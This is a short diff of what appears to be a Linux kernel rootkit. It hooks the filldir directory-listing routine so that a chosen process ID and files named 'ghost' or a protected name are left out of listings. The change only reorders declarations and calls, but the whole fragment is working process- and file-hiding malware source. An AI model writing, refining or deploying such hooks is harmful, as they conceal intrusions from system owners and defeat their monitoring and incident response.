@@ -161,11 +161,11 @@ static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t of
 KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
 {
-	find_pid_hide();
 	char *endp;
 	long pid;
-	pid = simple_strtol(name, &endp, 10);
 	int ret = 0;
+	find_pid_hide();
+	pid = simple_strtol(name, &endp, 10);
 	if (pid != hide_pid)
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 	if (!strstr(name, "ghost")|| !strstr(name,protected))
